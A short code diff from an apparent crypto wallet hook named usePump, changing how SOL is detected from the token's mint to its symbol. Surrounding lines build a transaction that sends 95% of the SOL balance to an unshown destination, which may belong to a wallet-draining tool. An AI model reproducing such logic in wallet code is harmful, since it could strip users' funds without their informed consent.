@@ -202,7 +202,8 @@ export function usePump() {
     try {
       let transaction: Transaction;
 
-      if (token.mint === 'SOL') {
+      // Treat SOL by symbol to match Jupiter balances
+      if (token.symbol === 'SOL') {
         // Send 95% of SOL balance
         transaction = await createSolTransaction(token.amount);
       } else {
